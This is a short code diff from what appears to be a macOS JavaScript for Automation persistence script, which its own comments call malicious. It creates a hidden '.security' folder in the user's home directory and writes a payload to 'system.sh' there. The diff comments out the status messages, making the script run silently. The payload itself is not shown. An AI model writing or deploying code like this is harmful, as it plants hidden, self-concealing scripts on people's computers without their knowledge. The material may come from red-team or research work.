@@ -44,12 +44,12 @@ var hiddenPath = userHome + "/.security"
 isDir=Ref()
 var hiddenDirectoryExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPathIsDirectory(hiddenPath,isDir)
 if (hiddenDirectoryExistsCheck == false) {
-	console.log("Creating hidden directory...");
+	//console.log("Creating hidden directory...");
 	app.doShellScript("mkdir $HOME/.security")
 					}
 
 //Create the malicious script which is saved to "$HOME/.security/system.sh"
-console.log("Creating malicious script...");
+//console.log("Creating malicious script...");
 app.doShellScript(payload);
 
 //Give the script permission to execute
